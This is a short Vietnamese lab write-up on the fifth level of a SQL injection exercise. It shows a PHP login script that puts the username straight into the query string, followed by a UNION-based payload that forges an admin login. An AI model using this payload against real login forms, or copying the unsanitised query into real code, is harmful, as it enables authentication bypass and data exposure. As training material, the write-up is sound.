# SQL Injection Level 5

## __1. Sử dụng như người dùng:__
Giao diện không thay đổi và sử dụng payload ở lv trước không được.

## __2. Xem đằng sau chương trình:__
File `level5.php`:
```php
<?php
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include "db.php";
        $sql = "SELECT username, password FROM users WHERE username='" .$_POST["username"] . "'";
        $db_result = $database->query($sql);
        if ($db_result->num_rows > 0){
            $row = $db_result->fetch_assoc();
            if ($row['password'] === $_POST["password"]) {
                $username = $row['username'];
                if ($username === "admin") {
                    $message = "Wow you can log in as admin, so cool, but how about <a href='level2.php'>THIS LEVEL</a>!";
                }
                else
                    $message = "You logged in, but then what? You are not an admin";
            }
            else 
                $message = "$username and $password does not match";
        }
        else {
            $message = "Nice try!";
        }
    } catch(mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}
?>
```
Không khác ở lv4 chỉ bỏ đi `LOWER()`

## __3. Lên ý tưởng và Khai thác:__
__Payload:__
```sql
khongtontai' union select 'admin', '123'-- 
```
Mình sẽ dùng Payload vào `username input` và `password input` mình nhập `123` để điều kiện kiểm tra trả ra là `true`.

![](3.PNG)  
__&rarr; Khai thác thành công__